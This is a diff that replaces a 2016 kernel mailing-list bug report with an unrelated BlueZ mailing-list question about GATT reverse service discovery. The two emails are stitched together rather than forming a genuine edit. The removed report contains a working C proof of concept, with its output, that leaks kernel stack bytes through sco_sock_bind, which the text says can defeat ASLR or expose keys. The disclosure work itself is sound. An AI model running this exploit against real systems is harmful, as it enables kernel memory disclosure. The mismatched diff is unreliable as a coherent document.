@@ -1,130 +1,36 @@
-Return-Path: <ubraun@linux.vnet.ibm.com>
-Message-ID: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
-Subject: [Fwd: Fw: Information leak in sco_sock_bind]
-From: Ursula Braun <ubraun@linux.vnet.ibm.com>
-To: Dmitry Vyukov <dvyukov@google.com>
-Cc: Marcel Holtmann <marcel@holtmann.org>,
-        Gustavo Padovan
- <gustavo@padovan.org>,
-        Johan Hedberg <johan.hedberg@gmail.com>,
-        "David S.
- Miller" <davem@davemloft.net>,
-        linux-bluetooth@vger.kernel.org, netdev
- <netdev@vger.kernel.org>,
-        LKML <linux-kernel@vger.kernel.org>,
-        syzkaller
- <syzkaller@googlegroups.com>,
-        Kostya Serebryany <kcc@google.com>,
-        Alexander Potapenko <glider@google.com>,
-        Sasha Levin
- <sasha.levin@oracle.com>,
-        Eric Dumazet <edumazet@google.com>, Kees Cook
- <keescook@google.com>,
-        Hannes Frederic Sowa <hannes@stressinduktion.org>,
-        "Ursula Braun1/Germany/IBM"@de.ibm.com, linux-s390@vger.kernel.org,
-        Lauro Ramos
- Venancio <lauro.venancio@openbossa.org>,
-        Aloisio Almeida Jr
- <aloisio.almeida@openbossa.org>,
-        Samuel Ortiz <sameo@linux.intel.com>
-Date: Fri, 15 Jan 2016 09:25:01 +0100
-Content-Type: text/plain; charset="UTF-8"
-Mime-Version: 1.0
+Return-Path: <linux-bluetooth-owner@vger.kernel.org>
+From: Adam Moore <adam.moore@savantsystems.com>
+To: "linux-bluetooth@vger.kernel.org" <linux-bluetooth@vger.kernel.org>
+Subject: LE Reverse Service Discovery
+Date: Fri, 15 Jan 2016 01:41:10 +0000
+Message-ID: <D2BD8E35.1AB78%adam.moore@savant.com>
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Sender: linux-bluetooth-owner@vger.kernel.org
 List-ID: <linux-bluetooth.vger.kernel.org>
 
-Hi Dmitry,
+I¹ve noticed that since around BlueZ 5.27, GATT client functionality is
+enabled for all devices.
 
-thx for mentioning iucv_sock_bind here. I will provide the equivalent
-fix and add your name as "Reported-by" - if you do not object.
+>From a LE Peripheral's perspective, this results in unconditional reverse
+service discovery of a Central's GATT services.
 
-Regards, Ursula Braun
+It seems like this will not always be necessary depending on the use case,
+and disabling GATT client functionality should save energy and time.  My
+iPhone, for example, has about 8 services that my Peripheral doesn¹t care
+about.
 
------ Forwarded by Ursula Braun1/Germany/IBM on 15/01/2016 09:18 -----
+I¹m considering making an attempt to disable this, as the BT spec says
+GATT clients are optional for LE peripherals. (BT 4.2, Vol 3, Part C,
+Table 15.1), but I first would like to ask if anyone has any insight on
+why it may be desirable to keep the client functionality enabled.
 
-From:        Dmitry Vyukov <dvyukov@google.com>
-To:        Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan
-<gustavo@padovan.org>, Johan Hedberg <johan.hedberg@gmail.com>, "David
-S. Miller" <davem@davemloft.net>, linux-bluetooth@vger.kernel.org,
-netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>,
-syzkaller <syzkaller@googlegroups.com>, Kostya Serebryany
-<kcc@google.com>, Alexander Potapenko <glider@google.com>, Sasha Levin
-<sasha.levin@oracle.com>, Eric Dumazet <edumazet@google.com>, Kees Cook
-<keescook@google.com>, Hannes Frederic Sowa
-<hannes@stressinduktion.org>, Ursula Braun1/Germany/IBM@IBMDE,
-linux-s390@vger.kernel.org, Lauro Ramos Venancio
-<lauro.venancio@openbossa.org>, Aloisio Almeida Jr
-<aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>, 
-Date:        15/12/2015 21:02
-Subject:        Information leak in sco_sock_bind
+Thanks!
+Adam
 
-Hello,
 
-The following program leads to leak of 6 bytes from kernel stack:
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <linux/in.h>
-#include <linux/in6.h>
-#include <linux/socket.h>
-#include <linux/if.h>
-#include <errno.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
+Statement of Confidentiality
 
-struct sockaddr_sco {
-sa_family_t     sco_family;
-char        sco_bdaddr[6];
-};
+The contents of this e-mail message and any attachments are confidential and are intended solely for the addressee. The information may also be legally privileged. This transmission is sent in trust, and the sole purpose of delivery to the intended recipient. If you have received this transmission in error, any use, reproduction or dissemination of this transmission is strictly prohibited. If you are not the intended recipient, please immediately notify the sender by reply e-mail or at 508.683.2500 and delete this message and its attachments, if any.
 
-#define BTPROTO_SCO 2
-
-int main(void)
-{
-       struct sockaddr sa;
-       struct sockaddr_sco sco_sa;
-       unsigned len, i, try;
-       int fd;
-
-       for (try = 0; try < 3; try++) {
-               fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
-               if (fd == -1)
-                       return;
-               switch (try) {
-               case 0:
-               break;
-               case 1:
-               sched_yield();
-               break;
-               case 2:
-               open("/dev/null", O_RDONLY);
-               }
-               memset(&sco_sa, 0, sizeof(sco_sa));
-               sco_sa.sco_family = AF_BLUETOOTH;
-               bind(fd, &sco_sa, 2);
-               len = sizeof(sa);
-               getsockname(fd, &sa, &len);
-               for (i = 0; i < len; i++)
-                       printf("%02x", ((unsigned char*)&sa)[i]);
-               printf("\n");
-       }
-       return 0;
-}
-
-Output:
-1f00333e0088ffff
-1f00c13e0088ffff
-1f002081ffffffff
-
-The problem is that sco_sock_bind does not check sockaddr_len passed
-in, so it copies stack garbage from stack into the socket. This can
-defeat ASLR, leak crypto keys, etc.
-We've just fixed a similar issue in pptp_bind. The similar issue is in
-llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
-bug in iucv_sock_bind, it is S390 specific, so I can't test it.
-
-Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
-or add addr size to proto struct to prevent all such existing and
-future bugs.
